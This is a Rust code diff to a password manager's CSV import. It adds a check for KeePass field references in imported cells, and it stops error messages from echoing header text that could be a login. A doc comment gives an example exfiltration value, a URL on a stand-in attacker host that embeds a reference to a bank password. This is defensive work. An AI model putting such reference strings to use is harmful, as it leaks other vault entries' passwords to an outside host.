@@ -29,6 +29,22 @@ pub struct Row {
 }
 
 impl Row {
+    /// Whether any cell holds a KeePass field reference, which would hand out another entry's
+    /// value once it is in the vault: `https://evil.example/?p={REF:P@T:bank}` is a bank password.
+    pub fn has_reference(&self) -> bool {
+        [
+            &self.group,
+            &self.title,
+            &self.username,
+            &self.password,
+            &self.url,
+            &self.notes,
+            &self.otp,
+        ]
+        .iter()
+        .any(|cell| crate::vault::has_reference(cell))
+    }
+
     /// What `Drop` does, observable on a live value. See `vault::Extra::wipe`.
     pub fn wipe(&mut self) {
         use zeroize::Zeroize;
@@ -84,9 +100,10 @@ pub fn read_csv(text: &str) -> Result<Import, String> {
     };
     let map: Vec<Option<&'static str>> = header.iter().map(|h| column(h)).collect();
     if !map.contains(&Some("title")) {
+        // The count, never the cells: a file with no header row has a login where the header goes.
         return Err(format!(
-            "no title column · the header is: {}",
-            header.join(", ")
+            "no title column · found {} columns · the first row must be a header",
+            header.len()
         ));
     }
     let ignored: Vec<String> = header
@@ -466,13 +483,14 @@ mod tests {
         assert_eq!(row.title, "mail");
     }
 
-    /* A file with no title column cannot be imported into anything useful,
-    and the message has to name what it did find. */
+    // A file with no title column is refused with how many columns it had, never their text: with
+    // no header row at all, the first row is a login.
     #[test]
     fn a_file_without_a_title_column_says_what_it_found_instead() {
         let err = read_csv("user,pass\nocto,pw\n").unwrap_err();
         assert!(err.contains("no title column"), "{err}");
-        assert!(err.contains("user"), "{err}");
+        assert!(err.contains("found 2 columns"), "{err}");
+        assert!(!err.contains("user"), "{err}");
         assert!(read_csv("").unwrap_err().contains("empty"));
 
         // A row with an empty title still imports, under a name that says so.
